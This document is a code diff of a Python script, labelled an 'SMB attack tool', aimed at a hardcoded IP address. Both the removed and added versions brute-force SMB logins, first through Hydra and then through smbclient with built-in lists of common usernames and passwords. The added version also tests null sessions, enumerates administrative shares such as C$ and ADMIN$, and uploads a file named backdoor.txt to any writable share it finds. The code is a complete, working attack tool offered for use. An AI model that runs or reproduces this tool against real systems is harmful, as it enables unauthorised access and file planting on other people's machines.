@@ -4,258 +4,290 @@ import sys
 import time
 
 TARGET_IP = "12.13.14.3"
-LOGIN_FILE = "login"  # login file
-PASS_FILE = "passw"   # password file
 LOCAL_FILE = "backdoor.txt"
 REMOTE_FILE = "backdoor.txt"
 
-def create_files():
-    """Create necessary files if they don't exist"""
-    if not os.path.exists(LOCAL_FILE):
-        print(f"[*] Creating file {LOCAL_FILE}...")
-        with open(LOCAL_FILE, "w") as f:
-            f.write("Backdoor file\n")
-            f.write(f"Time: {time.ctime()}\n")
-            f.write(f"Target: {TARGET_IP}\n")
-            f.write("Test file for SMB upload\n")
-
-def run_hydra():
-    """Run Hydra with YOUR syntax"""
-    print("\n" + "="*50)
-    print("[*] Starting Hydra...")
-    
-    # YOUR syntax: hydra -L login -P passw -o found smb2://12.13.14.3
-    hydra_cmd = f"hydra -L {LOGIN_FILE} -P {PASS_FILE} -o found smb2://{TARGET_IP}"
-    print(f"[*] Command: {hydra_cmd}")
-    
-    try:
-        # Run Hydra
-        result = subprocess.run(hydra_cmd, shell=True, capture_output=True, text=True, timeout=300)
-        
-        print("[*] Hydra output:")
-        print("-" * 40)
-        print(result.stdout)
-        if result.stderr:
-            print("\n[!] Hydra errors:")
-            print(result.stderr)
-        print("-" * 40)
-        
-        # Check result
-        if result.returncode == 0:
-            print("[+] Hydra completed successfully")
-        else:
-            print(f"[-] Hydra exited with code {result.returncode}")
-            
-        # Check found file
-        if os.path.exists("found"):
-            print("[+] File 'found' created, checking...")
-            with open("found", "r") as f:
-                content = f.read()
-                print("[*] Content of 'found' file:")
-                print(content)
-                
-                # Parse login and password
-                username = None
-                password = None
-                
-                for line in content.split('\n'):
-                    if TARGET_IP in line and "login" in line.lower():
-                        # Format: host: 12.13.14.3 login: admin password: pass123
-                        parts = line.split()
-                        for i, part in enumerate(parts):
-                            if "login:" in part.lower() and i+1 < len(parts):
-                                username = parts[i+1]
-                            if "password:" in part.lower() and i+1 < len(parts):
-                                password = parts[i+1]
-                        
-                        if username and password:
-                            print(f"[+] Found credentials: {username}:{password}")
-                            return username, password
-        else:
-            print("[-] File 'found' not created - Hydra didn't find credentials")
-            
-    except subprocess.TimeoutExpired:
-        print("[-] Hydra timeout (5 minutes)")
-    except Exception as e:
-        print(f"[-] Error running Hydra: {e}")
-    
-    return None, None
-
-def test_smb_directly():
-    """Test SMB directly without Hydra"""
-    print("\n" + "="*50)
-    print("[*] Direct SMB testing...")
-    
-    # First check availability
-    print("[*] Checking SMB availability...")
-    test_cmd = f"smbclient -L //{TARGET_IP}/ -N 2>&1 | head -20"
-    result = subprocess.run(test_cmd, shell=True, capture_output=True, text=True)
-    print("[*] Check result:")
-    print(result.stdout)
-    
-    # Test common credentials
-    test_creds = [
-        ("administrator", ""),
-        ("administrator", "admin"),
-        ("administrator", "password"),
-        ("administrator", "123456"),
-        ("admin", "admin"),
-        ("admin", "password"),
-        ("guest", ""),
-        ("", ""),  # empty both
-    ]
-    
-    for user, pwd in test_creds:
-        print(f"[*] Testing: {user}:{pwd if pwd else '(empty)'}")
-        cmd = f"smbclient //{TARGET_IP}/IPC$ -U '{user}%{pwd}' -c 'exit' 2>/dev/null"
-        if subprocess.run(cmd, shell=True).returncode == 0:
-            print(f"[+] Works: {user}:{pwd}")
-            return user, pwd
-    
-    return None, None
-
-def get_shares(username, password):
-    """Get list of accessible shares"""
-    print(f"[*] Getting shares for {username}...")
-    
-    shares_cmd = f"smbclient -L //{TARGET_IP}/ -U '{username}%{password}'"
-    result = subprocess.run(shares_cmd, shell=True, capture_output=True, text=True)
-    
-    shares = []
-    if result.returncode == 0:
-        for line in result.stdout.split('\n'):
-            if 'Disk' in line or 'IPC' in line:
-                try:
-                    share_name = line.split()[0]
-                    shares.append(share_name)
-                except:
-                    pass
-    
-    # If no shares found, try common ones
-    if not shares:
-        shares = ['C$', 'ADMIN$', 'D$', 'E$', 'IPC$', 'print$', 'NETLOGON', 'SYSVOL']
-    
-    # Test each share
-    accessible_shares = []
-    for share in shares:
-        test_cmd = f"smbclient //{TARGET_IP}/{share} -U '{username}%{password}' -c 'exit' 2>/dev/null"
-        if subprocess.run(test_cmd, shell=True).returncode == 0:
-            accessible_shares.append(share)
-    
-    return accessible_shares
-
-def upload_file(username, password):
-    """Upload file to server"""
-    print("\n" + "="*50)
-    print("[*] Trying to upload file...")
-    
-    # Get accessible shares
-    shares = get_shares(username, password)
-    
-    if not shares:
-        print("[-] No accessible shares found")
-        return False
-    
-    print(f"[*] Found {len(shares)} accessible shares: {shares}")
-    
-    # Try to upload to each share (skip IPC$)
-    for share in shares:
-        if share == 'IPC$':
-            continue  # Can't upload to IPC$
-            
-        print(f"\n[*] Trying share: {share}")
-        
-        # Try to upload file
-        upload_cmd = f"smbclient //{TARGET_IP}/{share} -U '{username}%{password}' -c 'put {LOCAL_FILE} {REMOTE_FILE}'"
-        print(f"[*] Upload command: {upload_cmd}")
-        
-        result = subprocess.run(upload_cmd, shell=True, capture_output=True, text=True)
-        
-        if result.returncode == 0:
-            print(f"[+] File uploaded to {share}!")
-            print(f"[+] Path: \\\\{TARGET_IP}\\{share}\\{REMOTE_FILE}")
-            
-            # Verify file exists
-            check_cmd = f"smbclient //{TARGET_IP}/{share} -U '{username}%{password}' -c 'dir {REMOTE_FILE}'"
-            check_result = subprocess.run(check_cmd, shell=True, capture_output=True, text=True)
-            
-            if check_result.returncode == 0:
-                print("[+] File verified on server!")
-            return True
-        else:
-            print(f"[-] Upload error: {result.stderr[:100] if result.stderr else 'Unknown error'}")
-    
-    return False
-
-def main():
-    print("="*60)
-    print("SMB ATTACK AND FILE UPLOAD")
+def print_banner():
+    print("\n" + "="*60)
+    print("SMB ATTACK TOOL - ALPINE VERSION")
     print(f"Target: {TARGET_IP}")
     print("="*60)
+
+def check_smb_service():
+    """Check if SMB service is running"""
+    print("[*] Checking SMB service...")
     
-    # Create files if needed
-    create_files()
+    # Check port 445
+    check_port = f"nc -z -w 2 {TARGET_IP} 445"
+    result = subprocess.run(check_port, shell=True, capture_output=True, text=True)
     
-    # Check if login/password files exist
-    if not os.path.exists(LOGIN_FILE):
-        print(f"[-] File {LOGIN_FILE} not found!")
-        print("[*] Create file with logins (one per line)")
-        print("[*] Example: echo 'admin' > login")
+    if result.returncode == 0:
+        print("[+] Port 445 is OPEN (SMB)")
+        return True
+    else:
+        print("[-] Port 445 is CLOSED")
+        return False
+
+def create_wordlists():
+    """Create better wordlists if needed"""
+    if not os.path.exists("users.txt"):
+        print("[*] Creating users.txt...")
+        users = [
+            "administrator", "admin", "student", "user", "guest",
+            "test", "backup", "web", "ftp", "sql",
+            "Administrator", "Admin", "Student", "User",
+            "",  # empty username
+        ]
+        with open("users.txt", "w") as f:
+            for user in users:
+                f.write(user + "\n")
+    
+    if not os.path.exists("passwords.txt"):
+        print("[*] Creating passwords.txt...")
+        passwords = [
+            "",  # empty password
+            "password", "123456", "admin", "Administrator",
+            "student", "Student", "11111111", "22222222",
+            "12345678", "qwerty", "abc123", "password123",
+            "admin123", "letmein", "welcome", "monkey",
+            "123456789", "1234567890", "123123", "111111",
+            "12345", "1234", "123", "1234567",
+        ]
+        with open("passwords.txt", "w") as f:
+            for pwd in passwords:
+                f.write(pwd + "\n")
+    
+    if not os.path.exists(LOCAL_FILE):
+        print(f"[*] Creating {LOCAL_FILE}...")
+        with open(LOCAL_FILE, "w") as f:
+            f.write("Test file uploaded via SMB\n")
+            f.write(f"Time: {time.ctime()}\n")
+            f.write(f"Target: {TARGET_IP}\n")
+
+def test_null_session():
+    """Test null/anonumous session"""
+    print("\n[*] Testing null session (anonymous access)...")
+    
+    cmd = f"smbclient -L //{TARGET_IP}/ -N"
+    result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
+    
+    if result.returncode == 0:
+        print("[+] Null session successful!")
+        print("[*] Shares found:")
+        for line in result.stdout.split('\n'):
+            if 'Disk' in line or 'IPC' in line:
+                print(f"   {line}")
+        return True
+    else:
+        print("[-] Null session failed")
+        return False
+
+def brute_force_smb():
+    """Brute force SMB with smbclient directly"""
+    print("\n[*] Starting SMB brute force...")
+    
+    # Read users and passwords
+    if not os.path.exists("users.txt"):
+        print("[-] users.txt not found")
+        return None, None
+    
+    if not os.path.exists("passwords.txt"):
+        print("[-] passwords.txt not found")
+        return None, None
+    
+    with open("users.txt", "r") as f:
+        users = [line.strip() for line in f if line.strip() is not None]
+    
+    with open("passwords.txt", "r") as f:
+        passwords = [line.strip() for line in f if line.strip() is not None]
+    
+    print(f"[*] Testing {len(users)} users × {len(passwords)} passwords")
+    
+    for user in users:
+        print(f"\n[*] Testing user: '{user}'")
+        
+        for pwd in passwords:
+            # Show progress
+            sys.stdout.write(f"  Testing password: '{pwd if pwd else '(empty)'}'\r")
+            sys.stdout.flush()
+            
+            # Test with IPC$ share
+            cmd = f"smbclient //{TARGET_IP}/IPC$ -U '{user}%{pwd}' -c 'exit' 2>/dev/null"
+            result = subprocess.run(cmd, shell=True)
+            
+            if result.returncode == 0:
+                print(f"\n[+] FOUND! Credentials: '{user}':'{pwd}'")
+                return user, pwd
+            
+            time.sleep(0.1)  # Small delay
+    
+    print("\n[-] No valid credentials found")
+    return None, None
+
+def test_credentials_interactive():
+    """Test credentials interactively"""
+    print("\n[*] Interactive credential testing")
+    print("[*] Enter credentials to test (leave empty to skip)")
+    
+    while True:
+        print("\n" + "-"*40)
+        username = input("Username: ").strip()
+        if not username:
+            break
+        
+        password = input("Password: ").strip()
+        
+        print(f"\n[*] Testing: '{username}':'{password if password else '(empty)'}'")
+        
+        # Test connection
+        cmd = f"smbclient //{TARGET_IP}/IPC$ -U '{username}%{password}' -c 'exit'"
+        result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
+        
+        if result.returncode == 0:
+            print("[+] CREDENTIALS WORK!")
+            choice = input("[*] Use these credentials? (y/n): ").lower()
+            if choice == 'y':
+                return username, password
+        else:
+            print("[-] Invalid credentials")
+            print(f"[*] Error: {result.stderr[:100] if result.stderr else 'Unknown'}")
+    
+    return None, None
+
+def enumerate_shares(username, password):
+    """Enumerate SMB shares with given credentials"""
+    print(f"\n[*] Enumerating shares for '{username}':'{password}'...")
+    
+    cmd = f"smbclient -L //{TARGET_IP}/ -U '{username}%{password}'"
+    result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
+    
+    if result.returncode != 0:
+        print("[-] Failed to enumerate shares")
+        print(f"[*] Error: {result.stderr[:200]}")
+        return []
+    
+    shares = []
+    print("[*] Available shares:")
+    for line in result.stdout.split('\n'):
+        if 'Disk' in line or 'IPC' in line:
+            try:
+                parts = line.split()
+                if parts:
+                    share_name = parts[0]
+                    shares.append(share_name)
+                    print(f"   - {line}")
+            except:
+                pass
+    
+    return shares
+
+def try_upload(username, password, share):
+    """Try to upload file to specific share"""
+    print(f"\n[*] Trying to upload to {share}...")
+    
+    # First test access
+    test_cmd = f"smbclient //{TARGET_IP}/{share} -U '{username}%{password}' -c 'exit'"
+    test_result = subprocess.run(test_cmd, shell=True, capture_output=True, text=True)
+    
+    if test_result.returncode != 0:
+        print(f"[-] No access to {share}")
+        return False
+    
+    # Try upload
+    upload_cmd = f"smbclient //{TARGET_IP}/{share} -U '{username}%{password}' -c 'put {LOCAL_FILE} {REMOTE_FILE}'"
+    print(f"[*] Command: {upload_cmd}")
+    
+    result = subprocess.run(upload_cmd, shell=True, capture_output=True, text=True)
+    
+    if result.returncode == 0:
+        print(f"[+] SUCCESS! File uploaded to {share}")
+        print(f"[+] Path: \\\\{TARGET_IP}\\{share}\\{REMOTE_FILE}")
+        return True
+    else:
+        print(f"[-] Upload failed: {result.stderr[:100] if result.stderr else 'Unknown error'}")
+        return False
+
+def main():
+    print_banner()
+    
+    # Check SMB service
+    if not check_smb_service():
+        print("[-] SMB service not available")
         return
     
-    if not os.path.exists(PASS_FILE):
-        print(f"[-] File {PASS_FILE} not found!")
-        print("[*] Create file with passwords (one per line)")
-        print("[*] Example: echo 'password' > passw")
+    # Create wordlists and test file
+    create_wordlists()
+    
+    # Test null session first
+    if test_null_session():
+        print("[+] You have anonymous access!")
+        print("[*] Try: smbclient //{TARGET_IP}/C$ -N -c 'dir'")
         return
     
     # Get credentials
     username, password = None, None
     
-    # Option 1: Hydra
-    print("\n1. Trying Hydra...")
-    username, password = run_hydra()
+    # Option 1: Brute force
+    print("\n" + "="*60)
+    print("[*] OPTION 1: BRUTE FORCE")
+    username, password = brute_force_smb()
     
-    # Option 2: Direct testing
-    if not username or not password:
-        print("\n2. Hydra failed, trying direct testing...")
-        username, password = test_smb_directly()
-    
-    # Option 3: Manual input
-    if not username or not password:
-        print("\n3. All auto methods failed")
-        print("[*] Enter credentials manually")
-        username = input("Login: ").strip()
-        password = input("Password (Enter if empty): ").strip()
+    # Option 2: Interactive testing
+    if not username:
+        print("\n" + "="*60)
+        print("[*] OPTION 2: INTERACTIVE TESTING")
+        username, password = test_credentials_interactive()
     
     if not username:
-        print("[-] No login provided. Exit.")
+        print("\n[-] No valid credentials obtained")
+        print("[*] Try other attack methods:")
+        print("    1. Check for other services (SSH, FTP, RDP)")
+        print("    2. Use different wordlists")
+        print("    3. Try other SMB tools (enum4linux, nmap scripts)")
         return
     
-    print(f"\n[+] Using credentials: {username}:{password if password else '(empty)'}")
+    print(f"\n[+] Using credentials: '{username}':'{password if password else '(empty)'}'")
     
-    # Upload file
-    if upload_file(username, password):
-        print("\n" + "="*50)
-        print("[+] SUCCESS! File uploaded to server!")
-        print(f"[+] Check: smbclient //{TARGET_IP}/C$ -U '{username}%{password}' -c 'dir'")
+    # Enumerate shares
+    shares = enumerate_shares(username, password)
+    
+    if not shares:
+        print("[-] No shares accessible with these credentials")
+        return
+    
+    # Try to upload to writable shares
+    writable_shares = []
+    for share in shares:
+        if share != 'IPC$':  # Skip IPC$
+            if try_upload(username, password, share):
+                writable_shares.append(share)
+                break  # Stop after first successful upload
+    
+    # Summary
+    print("\n" + "="*60)
+    print("[*] ATTACK SUMMARY")
+    print("="*60)
+    
+    if writable_shares:
+        print("[+] SUCCESS: File uploaded to shares:", writable_shares)
     else:
-        print("\n" + "="*50)
-        print("[-] Failed to upload file")
+        print("[-] FAILED: Could not upload file")
         print("[*] Possible reasons:")
-        print("    - No write permissions")
-        print("    - No access to disk shares")
-        print("    - Firewall blocking writes")
+        print("    - Read-only access")
+        print("    - Insufficient permissions")
+        print("    - File already exists")
         
-        print("\n[*] Commands to check:")
-        print(f"    smbclient -L //{TARGET_IP}/ -U '{username}%{password}'")
-        print(f"    smbclient //{TARGET_IP}/C$ -U '{username}%{password}' -c 'dir'")
-        print(f"    crackmapexec smb {TARGET_IP} -u '{username}' -p '{password}' --shares")
+        print("\n[*] Try these commands:")
+        print(f"    1. smbclient //{TARGET_IP}/C$ -U '{username}%{password}'")
+        print(f"    2. smbclient //{TARGET_IP}/ADMIN$ -U '{username}%{password}'")
+        print(f"    3. Try creating a directory: smbclient //{TARGET_IP}/C$ -U '{username}%{password}' -c 'mkdir test'")
 
 if __name__ == "__main__":
     try:
         main()
     except KeyboardInterrupt:
         print("\n\n[-] Interrupted by user")
+        sys.exit(0)
     except Exception as e:
         print(f"\n[-] Error: {e}")
+        sys.exit(1)
